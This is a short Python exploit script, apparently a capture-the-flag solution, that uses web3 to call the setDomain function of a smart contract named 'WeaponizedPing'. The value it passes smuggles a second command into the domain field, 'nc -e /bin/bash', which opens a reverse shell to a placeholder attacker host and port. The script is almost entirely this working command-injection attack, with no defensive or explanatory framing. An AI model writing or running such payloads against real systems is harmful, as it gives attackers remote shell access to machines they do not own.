#!/usr/bin/python3

from web3 import Web3
import json

w3 = Web3(Web3.HTTPProvider('ip:port'))
print (w3.isConnected)

target_address = open('address.txt','r').read()
target_address = target_address.replace('\n','')
print ("Target address: "+ target_address)

with open('WeaponizedPing.json') as f:
    testData = json.load(f)

w3.eth.defaultAccount = w3.eth.accounts[0]
contract = w3.eth.contract(address=target_address,abi=testData['abi'])
#REC payload reverse shell
payload = 'ip; nc -e /bin/bash ip port'

contract.functions.setDomain(payload).transact()
